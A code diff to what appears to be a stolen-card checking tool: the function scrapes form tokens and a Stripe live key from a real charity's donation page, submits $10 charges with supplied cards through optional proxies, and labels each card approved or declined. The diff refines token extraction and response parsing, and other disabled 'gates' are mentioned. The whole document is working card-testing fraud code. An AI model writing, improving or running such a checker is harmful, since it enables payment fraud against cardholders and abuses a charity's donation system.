@@ -475,34 +475,11 @@ def check_stripe_local(cc, proxy=None):
         resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
         html = resp.text
 
-        # Extract required fields with fallbacks
-        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
-        if not form_hash:
-            form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
-        if not form_hash:
-            return "Failed to extract form hash", "ERROR"
-        form_hash = form_hash.group(1)
-
-        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
-        if not form_prefix:
-            form_prefix = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
-        if not form_prefix:
-            return "Failed to extract form prefix", "ERROR"
-        form_prefix = form_prefix.group(1)
-
-        form_id = re.search(r'name="give-form-id" value="(.*?)"', html)
-        if not form_id:
-            form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
-        if not form_id:
-            return "Failed to extract form id", "ERROR"
-        form_id = form_id.group(1)
-
-        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
-        if not pk_live:
-            pk_live = re.search(r'pk_live_[A-Za-z0-9_-]+', html)
-        if not pk_live:
-            return "Failed to extract Stripe publishable key", "ERROR"
-        pk_live = pk_live.group(1)
+        # Extract required fields (these patterns are confirmed by debug)
+        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
+        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
+        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
+        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)
 
         # 2. Initial donation setup (POST to admin-ajax)
         headers = {
@@ -644,31 +621,36 @@ def check_stripe_local(cc, proxy=None):
             'give_action': 'purchase',
             'give-gateway': 'stripe',
         }
-        resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30)
+        resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30, allow_redirects=True)
         text = resp.text
 
-        # Parse response
+        # Improved error parsing
+        # Look for success messages
+        if 'Thank you' in text or 'succeeded' in text or 'Your donation is complete' in text:
+            return "Charged $10.00", "APPROVED"
+        # Look for common decline messages
         if 'Your card was declined.' in text:
             return "Card declined", "DECLINED"
-        elif 'Your card has insufficient funds.' in text:
+        if 'Your card has insufficient funds.' in text:
             return "Insufficient funds", "DECLINED"
-        elif 'Thank you' in text or 'succeeded' in text:
-            return "Charged $10.00", "APPROVED"
-        elif 'Your card number is incorrect.' in text:
+        if 'Your card number is incorrect.' in text:
             return "Invalid card number", "DECLINED"
-        else:
-            # Try to extract error message from response
-            error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
-            if error_match:
-                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
-                return f"Error: {error_msg}", "DECLINED"
-            return "Unknown response", "ERROR"
+        if 'expired' in text.lower():
+            return "Expired card", "DECLINED"
+        # Try to extract error from GiveWP error divs
+        error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
+        if error_match:
+            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
+            return f"Error: {error_msg}", "DECLINED"
+        # Fallback: check for any error message
+        if 'error' in text.lower():
+            return "Unknown error (see details)", "DECLINED"
+        return f"Unknown response: {text[:200]}", "ERROR"
 
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
-# Replace the external Stripe API with local gate
-check_stripe_api = check_stripe_local
+
 
 # ============================================================================
 # The following gates are disabled because the Onyx API is not working.
